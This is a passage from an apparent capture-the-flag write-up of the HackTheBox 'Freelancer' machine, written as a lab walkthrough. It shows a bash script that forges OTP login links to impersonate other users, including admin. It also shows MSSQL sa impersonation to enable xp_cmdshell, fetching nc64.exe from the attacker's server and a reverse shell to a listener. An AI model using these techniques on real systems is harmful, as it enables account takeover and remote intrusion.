+VoFS"iޙO[{(PGy5W3IXVջX`WŎXAg-xQ;m~(ȣ&gt;}=s&lt;#k(CAި֩nmP72iex#ȃ^bʳgA~}N}
+*ENd]Ի}]Owu5{An}lT06(6eoQ:F끭oz$պݾ&gt;Ub/lFn~lMjHÙ60e+&gt;gw$R"b0MK&lt;yPg+,HW(Zrs5u{bZzXk=g#9םg$1!D[f߂;&gt;CicRAbPW1f`jGOYы=g#M/gdAd߄JJ.IENDB`
+</span></code></pre></div></div>
+<p>That binary junk starts with the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic bytes</a> for a PNG image.</p>
+<h4 id="idor">IDOR</h4>
+<p>Looking more closely at the URL from the QR-Code, there are two pirces of data. I’ll call them the base64 element and the hex element, leaving the URL format as <code class="language-plaintext highlighter-rouge">http://freelancer.htb/accounts/login/otp/[base64]/[hex]/</code>.</p>
+<ul>
+<li>The base64 element, such as <code class="language-plaintext highlighter-rouge">MTAwMTA=</code>, seems to be the same for every URL generated by my account, but changes when I log into a different account.</li>
+<li>The hex element, such as <code class="language-plaintext highlighter-rouge">71c40e88da186a5d53afe78b585f1382</code>, changes for each QR generated.</li>
+</ul>
+<p>The base64 element decodes to a number:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo </span><span class="nv">MTAwMTA</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">10010
+</span></code></pre></div></div>
+<p>I registered my freelancer account just after my employer account, so it is likely 10011. I’ll encode that ID:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo </span>10011 | <span class="nb">base64</span>
+<span class="go">MTAwMTEK    
+</span></code></pre></div></div>
+<p>I’ll visit an updated link replacing the base64-encoded data with the new ID, and it shows the profile of my freelancer account:</p>
+<picture>
+<source srcset="/img/image-20240607143445689.webp" type="image/webp"/>
+<img alt="image-20240607143445689" class="include_image" loading="lazy" src="/img/image-20240607143445689.png"/>
+</picture>
+<p>This access suggests that as long as I have a valid hex element, it means I can log in as any user just by knowing their ID.</p>
+<h4 id="find-user-ids">Find User Ids</h4>
+<p>For the sake of playing with this, I’ll make a quick Bash script to take in a user ID and generate a new link:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-ne</span> 2 <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;session_cookie&gt; &lt;id&gt;"</span><span class="p">;</span>
+    <span class="nb">exit
+</span><span class="k">fi  
+
+</span>curl http://freelancer.htb/accounts/otp/qrcode/generate/ <span class="nt">-b</span> <span class="s2">"sessionid=</span><span class="nv">$1</span><span class="s2">"</span> <span class="nt">-o-</span> <span class="nt">-s</span> |
+    zbarimg - 2&gt;&amp;1 |
+    <span class="nb">grep </span>QR | <span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f2-</span> |
+    <span class="nb">sed</span> <span class="s2">"s/MTAwMTA=/</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">2</span><span class="k">}</span> | <span class="nb">base64</span> <span class="nt">-w0</span><span class="si">)</span><span class="s2">/"</span>
+</code></pre></div></div>
+<p>This gets the image URL for my account, decodes it, gets the URL, and replaces with <code class="language-plaintext highlighter-rouge">sed</code> my ID with the ID for the user I want to impersonate.</p>
+<p>Trying user id 10000 returns invalid:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou 10000
+<span class="go">http://freelancer.htb/accounts/login/otp/MTAwMDAK/501eb3087fb7c7a3c9667728aa10f2c6/
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="si">$(</span>./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou 10000<span class="si">)</span>
+<span class="go">Invalid user primary key!
+</span></code></pre></div></div>
+<p>Same with 10001 and 10002. I need to fuzz here. A quick <code class="language-plaintext highlighter-rouge">bash</code> loops seems safest:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>10000 10100<span class="si">)</span><span class="p">;</span> <span class="k">do </span>curl <span class="nt">-I</span> <span class="si">$(</span>./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou <span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="si">)</span> <span class="nt">-s</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"sessionid"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Found valid user: </span><span class="nv">$i</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">Found valid user: 10010
+Found valid user: 10011
+</span></code></pre></div></div>
+<p>It only finds my two accounts. I’ll try looking at low IDs starting with 0:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 100<span class="si">)</span><span class="p">;</span> <span class="k">do </span>curl <span class="nt">-I</span> <span class="si">$(</span>./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou <span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="si">)</span> <span class="nt">-s</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"sessionid"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Found valid user: </span><span class="nv">$i</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>  
+<span class="go">Found valid user: 2                                               
+Found valid user: 3                                               
+Found valid user: 4
+Found valid user: 5
+Found valid user: 6
+Found valid user: 7
+Found valid user: 8
+Found valid user: 9
+Found valid user: 10
+Found valid user: 11
+Found valid user: 12
+Found valid user: 13
+Found valid user: 14
+</span></code></pre></div></div>
+<p>There’s a bunch more users!</p>
+<h4 id="identify-admin-user">Identify Admin User</h4>
+<p>The user with id 2 has the username “admin”:</p>
+<picture>
+<source srcset="/img/image-20240607145012104.webp" type="image/webp"/>
+<img alt="image-20240607145012104" class="include_image" loading="lazy" src="/img/image-20240607145012104.png"/>
+</picture>
+<p>While logged in as admin, visiting <code class="language-plaintext highlighter-rouge">/admin</code> returns the admin dashboard:</p>
+<picture>
+<source srcset="/img/image-20240607145055171.webp" type="image/webp"/>
+<img alt="image-20240607145055171" class="include_image" loading="lazy" src="/img/image-20240607145055171.png"/>
+</picture>
+<h4 id="admin-enumeration">Admin Enumeration</h4>
+<p>Looking around the admin panel, there’s a list of email addresses under “Custom users”:</p>
+<picture>
+<source srcset="/img/image-20240607150914148.webp" type="image/webp"/>
+<img alt="image-20240607150914148" class="include_image" loading="lazy" src="/img/image-20240607150914148.png"/>
+</picture>
+<p>“Employers” and “Freelancers” has the same emails broken into two groups.</p>
+<p>The most interesting link is the “SQL Terminal” at the bottom of the right list, which opens a text area:</p>
+<picture>
+<source srcset="/img/image-20240607151106841.webp" type="image/webp"/>
+<img alt="image-20240607151106841" class="include_image" loading="lazy" src="/img/image-20240607151106841.png"/>
+</picture>
+<p>I can try a query, and the results show up below:</p>
+<picture>
+<source srcset="/img/image-20240607151134505.webp" type="image/webp"/>
+<img alt="image-20240607151134505" class="include_image" loading="lazy" src="/img/image-20240607151134505.png"/>
+</picture>
+<p>The query errors, but (a) the SQL Terminal works, and (b) it shows that it’s MSSQL Server.</p>
+<h4 id="db-enumeration">DB Enumeration</h4>
+<p>There is only one custom DB from <code class="language-plaintext highlighter-rouge">select name, database_id from sys.databases;</code>:</p>
+<picture>
+<source srcset="/img/image-20240607151546786.webp" type="image/webp"/>
+<img alt="image-20240607151546786" class="include_image" loading="lazy" src="/img/image-20240607151546786.png"/>
+</picture>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">select name from sys.tables;</code> to list the tables:</p>
+<picture>
+<source srcset="/img/image-20240607151742285.webp" type="image/webp"/>
+<img alt="image-20240607151742285" class="include_image" loading="lazy" src="/img/image-20240607151742285.png"/>
+</picture>
+<p>There’s nothing really interesting in the current database (which seems to be the <code class="language-plaintext highlighter-rouge">Freelancer_webapp_DB</code>).</p>
+<h3 id="rce-via-mssql">RCE Via MSSQL</h3>
+<h4 id="xp_cmdshell-disabled">xp_cmdshell Disabled</h4>
+<p>The first thing to try on an MSSQL DB is running commands with <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>:</p>
+<picture>
+<source srcset="/img/image-20240607152325525.webp" type="image/webp"/>
+<img alt="image-20240607152325525" class="include_image" loading="lazy" src="/img/image-20240607152325525.png"/>
+</picture>
+<p>It’s disabled. I can try to enable it:</p>
+<picture>
+<source srcset="/img/image-20240607152430923.webp" type="image/webp"/>
+<img alt="image-20240607152430923" class="include_image" loading="lazy" src="/img/image-20240607152430923.png"/>
+</picture>
+<p>The current user doesn’t have permissions.</p>
+<h4 id="db-permissions">DB Permissions</h4>
+<p>The application is currently running as Freelancer_webapp_user:</p>
+<picture>
+<source srcset="/img/image-20240607152518684.webp" type="image/webp"/>
+<img alt="image-20240607152518684" class="include_image" loading="lazy" src="/img/image-20240607152518684.png"/>
+</picture>
+<p>The DB users are stored in <code class="language-plaintext highlighter-rouge">sys.server_principals</code> (<a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql?view=sql-server-ver16&amp;tabs=sql">docs</a>). For some reason trying to <code class="language-plaintext highlighter-rouge">select * from sys.server_principals;</code> returns a 500 error and no update to the output, but limiting the selection works:</p>
+<picture>
+<source srcset="/img/image-20240607152956355.webp" type="image/webp"/>
+<img alt="image-20240607152956355" class="include_image" loading="lazy" src="/img/image-20240607152956355.png"/>
+</picture>
+<p>There’s a bunch of information also in the <code class="language-plaintext highlighter-rouge">sys.server_permissions</code> table (which does allow a <code class="language-plaintext highlighter-rouge">select * from</code>). It has a <code class="language-plaintext highlighter-rouge">grantee_principal_id</code> and a <code class="language-plaintext highlighter-rouge">grantor_principal_id</code>.</p>
+<p>Scrolling through the table, the most interesting <code class="language-plaintext highlighter-rouge">permission_name</code> that jumps out is “IMPERSONATE”.</p>
+<picture>
+<source srcset="/img/image-20240607153323703.webp" type="image/webp"/>
+<img alt="image-20240607153323703" class="include_image" loading="lazy" src="/img/image-20240607153323703.png"/>
+</picture>
+<p>User 267 (Freelancer_webapp_user) has been granted <code class="language-plaintext highlighter-rouge">IMPERSONATE</code> by user 1 (sa).</p>
+<p><a href="https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver16">This Microsoft document</a> describes how the <code class="language-plaintext highlighter-rouge">EXECUTE AS</code> statement can be used where this permission is granted to run commands as the grantor. It works:</p>
+<picture>
+<source srcset="/img/image-20240607153920813.webp" type="image/webp"/>
+<img alt="image-20240607153920813" class="include_image" loading="lazy" src="/img/image-20240607153920813.png"/>
+</picture>
+<h4 id="xp_cmdshell-success">xp_cmdshell Success</h4>
+<p>With access to <code class="language-plaintext highlighter-rouge">EXECUTE AS</code> for the sa (administrator) user, I’ll enable <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>:</p>
+<picture>
+<source srcset="/img/image-20240607154041021.webp" type="image/webp"/>
+<img alt="image-20240607154041021" class="include_image" loading="lazy" src="/img/image-20240607154041021.png"/>
+</picture>
+<p>No results is a significant improvement over the errors last time. I still can’t run commands as the original user:</p>
+<picture>
+<source srcset="/img/image-20240607155023436.webp" type="image/webp"/>
+<img alt="image-20240607155023436" class="include_image" loading="lazy" src="/img/image-20240607155023436.png"/>
+</picture>
+<p>But with impersonation I can:</p>
+<picture>
+<source srcset="/img/image-20240607154213539.webp" type="image/webp"/>
+<img alt="image-20240607154213539" class="include_image" loading="lazy" src="/img/image-20240607154213539.png"/>
+</picture>
+<p>There is a cron disabling <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>, so I found it useful to keep one browser tab for enabling it, and another for enumerating.</p>
+<p>A quick check with <code class="language-plaintext highlighter-rouge">whoami /priv</code> shows this user doesn’t have <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>:</p>
+<picture>
+<source srcset="/img/image-20240607154349843.webp" type="image/webp"/>
+<img alt="image-20240607154349843" class="include_image" loading="lazy" src="/img/image-20240607154349843.png"/>
+</picture>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<h4 id="standard-base64-encoded-fail">Standard Base64 Encoded [Fail]</h4>
+<p>My first attempt is to grab the PowerShell #3 (Base64) reverse shell from <a href="https://www.revshells.com/">revshells.com</a> and run it:</p>
+<picture>
+<source srcset="/img/image-20240607155311494.webp" type="image/webp"/>
+<img alt="image-20240607155311494" class="include_image" loading="lazy" src="/img/image-20240607155311494.png"/>
+</picture>
+<p>No shell comes back, and the response says it’s blocked by AV.</p>
+<h4 id="ncexe-shell">nc.exe Shell</h4>
+<p>I’ll try hosting <code class="language-plaintext highlighter-rouge">nc64.exe</code> from my Python webserver and uploading it to Freelancer:</p>
+<picture>
+<source srcset="/img/image-20240607155539209.webp" type="image/webp"/>
+<img alt="image-20240607155539209" class="include_image" loading="lazy" src="/img/image-20240607155539209.png"/>
+</picture>
+<p>There’s no output here, but a request at my server is a good sign:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.5 - - [07/Jun/2024 12:28:53] "GET /nc64.exe HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>Doing a directory listing shows it’s there:</p>
+<picture>
+<source srcset="/img/image-20240607155626632.webp" type="image/webp"/>
+<img alt="image-20240607155626632" class="include_image" loading="lazy" src="/img/image-20240607155626632.png"/>
+</picture>
+<p>I’ll trigger it to get a shell:</p>
+<picture>
+<source srcset="/img/image-20240607155708985.webp" type="image/webp"/>
+<img alt="image-20240607155708985" class="include_image" loading="lazy" src="/img/image-20240607155708985.png"/>
+</picture>
+<p>It hangs, but at my listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.5 63819
+Microsoft Windows [Version 10.0.17763.5830]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\WINDOWS\system32&gt;</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">freelancer\sql_svc
+</span></code></pre></div></div>
+<p>I’ll will also switch to PowerShell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\WINDOWS\system32&gt;</span><span class="w"> </span>powershell                       
+<span class="go">Windows PowerShell                                                
+Copyright (C) Microsoft Corporation. All rights reserved.
+</span><span class="gp">PS C:\WINDOWS\system32&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll note the intended path for this box was not to be able to get this shell, but rather do the enumeration through MSSQL, up through the next shell.</p>
+<h2 id="shell-as-mikasaackerman">Shell as mikasaAckerman</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="web">Web</h4>
+<p>In the root of <code class="language-plaintext highlighter-rouge">C:</code>, there are two directories, <code class="language-plaintext highlighter-rouge">apps</code> and <code class="language-plaintext highlighter-rouge">nginx</code> that are non-standard:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/24/2024   7:30 PM                apps
+d-----         6/3/2024  10:50 AM                nginx
+d-----        5/28/2024  11:47 AM                PerfLogs
+d-r---        5/28/2024   2:18 PM                Program Files
+d-----        5/28/2024   2:18 PM                Program Files (x86)
+d-----        5/27/2024   7:50 AM                temp
+d-r---        5/28/2024  10:19 AM                Users
+d-----        5/28/2024  11:50 AM                Windows
+</span></code></pre></div></div>
+<p>sql_svc can’t access <code class="language-plaintext highlighter-rouge">apps</code>. <code class="language-plaintext highlighter-rouge">nginx</code> has the webserver information:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\nginx&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\nginx
+
+Mode                LastWriteTime         Length Name                                                                       
+----                -------------         ------ ----                                                                       
+d-----        5/23/2024   7:24 PM                conf                                                                       
+d-----        5/23/2024   6:45 PM                contrib                                                                    
+d-----        5/23/2024   6:45 PM                docs                                                                       
+d-----        5/23/2024   6:45 PM                html                                                                       
+d-----        5/23/2024   7:26 PM                logs                                                                       
+d-----        5/24/2024   2:36 PM                sites-available                                                            
+d-----        5/24/2024   2:36 PM                sites-enabled                                                              
+d-----        5/23/2024   6:45 PM                temp                                                                       
+-a----        4/16/2024   7:01 PM        4716544 nginx.exe                                                                  
+-a----         6/3/2024  10:50 AM            263 start.bat 
+</span></code></pre></div></div>
+<p>In <code class="language-plaintext highlighter-rouge">sites-enabled</code>, there’s a config that’s proxying through to the application on TCP 8000:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\nginx\sites-enabled&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\nginx\sites-enabled
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/24/2024   2:36 PM            773 freelancer.conf
+
+</span><span class="gp">PS C:\nginx\sites-enabled&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">freelancer.conf</span><span class="w">
+</span><span class="go">limit_req_zone $binary_remote_addr zone=mylimit:10m rate=50r/s;
+server {
+    listen      80;
+    server_name freelancer.htb;
+    charset     utf-8;
+    gzip on;
+    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
+    gzip_proxied any;
+    gzip_vary on;
+
+    location /static/ {
+        limit_req zone=mylimit burst=30;
+        alias C:/apps/freelancer/freelancer/static/;
+    }
+
+    location / {
+        limit_req zone=mylimit burst=30;
+        proxy_pass http://localhost:8000;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+}
+</span></code></pre></div></div>
+<p>Given the reference to <code class="language-plaintext highlighter-rouge">C:/apps/freelancer</code> it seems safe to guess that at least that webapp lives in <code class="language-plaintext highlighter-rouge">apps</code>.</p>
+<h4 id="users">Users</h4>
+<p>There are a handful of users with home directories on the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/5/2024   8:23 PM                Administrator
+d-----        5/28/2024  10:23 AM                lkazanof
+d-----        5/28/2024  10:23 AM                lorra199
+d-----        5/28/2024  10:22 AM                mikasaAckerman
+d-----        8/27/2023   1:16 AM                MSSQLSERVER
+d-r---        5/28/2024   2:13 PM                Public
+d-----        5/28/2024  10:22 AM                sqlbackupoperator
+d-----         6/5/2024   8:23 PM                sql_svc
+</span></code></pre></div></div>
+<p>sql_svc’s home directory is mostly empty, except for the <code class="language-plaintext highlighter-rouge">Download\SQLEXPR-2019_x64_ENU</code> directory:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="400"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sql_svc&gt;</span><span class="w"> </span><span class="n">tree</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">/f</span><span class="w">
+</span><span class="go">Folder PATH listing
+Volume serial number is 8954-28AE
+C:\USERS\SQL_SVC
+3D Objects
+Contacts
+Desktop
+Documents
+Downloads
+   SQLEXPR-2019_x64_ENU
+          AUTORUN.INF
+          MEDIAINFO.XML
+          PackageId.dat
+          SETUP.EXE
+          SETUP.EXE.CONFIG
+          sql-Configuration.INI
+          SQLSETUPBOOTSTRAPPER.DLL
+
+       1033_ENU_LP
+             MEDIAINFO.XML
+
+          x64
+                 README.HTM
+
+              1033
+                     LICENSE_DEV.RTF
+                     LICENSE_EVAL.RTF
+                     LICENSE_EXPR.RTF
+                     PYTHONLICENSE.RTF
+                     README.HTM
+                     ROPENLICENSE.RTF
+
+              Setup
+                     CONN_INFO_LOC.MSI
+                     SMO_EXTENSIONS_LOC.MSI
+                     SMO_LOC.MSI
+                     SQLBROWSER.MSI
+                     SQLSUPPORT.MSI
+                     SQL_COMMON_CORE_LOC.MSI
+                     SQL_DMF_LOC.MSI
+                     SQL_ENGINE_CORE_INST_LOC.MSI
+                     SQL_ENGINE_CORE_SHARED_LOC.MSI
+                     SQL_XEVENT_LOC.MSI
+
+                  x64
+                          MSODBCSQL.MSI
+                          MSOLEDBSQL.MSI
+                          SQLNCLI.MSI
+                          SQLWRITER.MSI
+                          TSQLLANGUAGESERVICE.MSI
+
+       redist
+          VisualStudioShell
+              VCRuntimes
+                      VC_REDIST_X64.EXE
+                      VC_REDIST_X86.EXE
+
+       resources
+          1033
+                  SETUP.RLL
+
+       x64
+              ADDNODE.XML
+              COMPLETECLUSTERWIZARD.XML
+              COMPLETEIMAGEWIZARD.XML
+              COMPONENTUPDATE.XML
+              CONFIGURATION.UICFG
+              EDITIONUPGRADEWIZARD.XML
+              FIXSQLREGISTRYKEY_X64.EXE
+              FIXSQLREGISTRYKEY_X64.EXE.CONFIG
+              FIXSQLREGISTRYKEY_X86.EXE
+              FIXSQLREGISTRYKEY_X86.EXE.CONFIG
+              INSTALLCLUSTERWIZARD.XML
+              INSTALLWIZARD.XML
+              INSTAPI150.DLL
+              LANDINGPAGE.EXE
+              LANDINGPAGE.EXE.CONFIG
+              MICROSOFT.ANALYSISSERVICES.ADOMDCLIENT.DLL
+              MICROSOFT.ANALYSISSERVICES.CORE.DLL
+              MICROSOFT.ANALYSISSERVICES.DLL
+              MICROSOFT.ANALYSISSERVICES.SPCLIENT.INTERFACES.DLL
+              MICROSOFT.ANALYSISSERVICES.TABULAR.DLL
+              MICROSOFT.ANALYSISSERVICES.TABULAR.JSON.DLL
+              MICROSOFT.DIAGNOSTICS.TRACING.EVENTSOURCE.DLL
+              MICROSOFT.NETENTERPRISESERVERS.EXCEPTIONMESSAGEBOX.DLL
+              MICROSOFT.SQL.CHAINER.PACKAGE.DLL
+              MICROSOFT.SQL.CHAINER.PACKAGE.XMLSERIALIZERS.DLL
+              MICROSOFT.SQL.CHAINER.PACKAGEDATA.DLL
+              MICROSOFT.SQL.CHAINER.PRODUCT.DLL
+              MICROSOFT.SQL.CHAINER.PRODUCT.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CHAINER.EXTENSIONCOMMON.DLL
+              MICROSOFT.SQLSERVER.CHAINER.EXTENSIONCOMMON.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CHAINER.INFRASTRUCTURE.DLL
+              MICROSOFT.SQLSERVER.CHAINER.INFRASTRUCTURE.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CHAINER.WORKFLOWDATA.DLL
+              MICROSOFT.SQLSERVER.CHAINER.WORKFLOWDATA.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.AGENTEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.ASEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.ASTELEMETRYEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.BOOTSTRAPEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.BOOTSTRAPEXTENSION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.CLUSTER.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.CLUSTER.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.CONFIGEXTENSION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.DISTRIBUTEDREPLAYEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.EXTENSIBILITY_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.FULLTEXT_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.IMPY_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.IMR_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.INSTALLWIZARD.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.INSTALLWIZARDFRAMEWORK.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.INSTALLWIZARDFRAMEWORK.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.ISMASTEREXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.ISTELEMETRYCONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.ISWORKEREXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.MANAGEMENTTOOLSEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.MSIEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.MSIEXTENSION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.POLYBASECONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.POLYBASEJAVACONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.POWERSHELLEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.REPL_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.RSEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.RULESENGINEEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.RULESENGINEEXTENSION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SAA_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SCO.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SCO.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SCOEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SETUPEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SETUPEXTENSION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SLPEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SMARTSETUPEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SMARTSETUPEXTENSION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SMPY_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SMR_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SNISERVERCONFIGEXT.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SQLBROWSEREXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SQLCONFIGBASE.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SQLCONFIGBASE.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SQLSERVER_CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.SSISEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.TELEMETRYCONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.UIEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.UIEXTENSION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.UTILITYEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.WIZARDFRAMEWORK.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.WIZARDFRAMEWORK.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.WMIINTEROP.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.CONFIGURATION.XTP.CONFIGEXTENSION.DLL
+              MICROSOFT.SQLSERVER.CONNECTIONINFO.DLL
+              MICROSOFT.SQLSERVER.CUSTOMCONTROLS.DLL
+              MICROSOFT.SQLSERVER.DATAWAREHOUSE.WORKLOADDEPLOYMENT.DLL
+              MICROSOFT.SQLSERVER.DEPLOYMENT.DLL
+              MICROSOFT.SQLSERVER.DEPLOYMENT.XMLSERIALIZERS.DLL
+              MICROSOFT.SQLSERVER.DIAGNOSTICS.STRACE.DLL
+              MICROSOFT.SQLSERVER.DISCOVERY.DLL
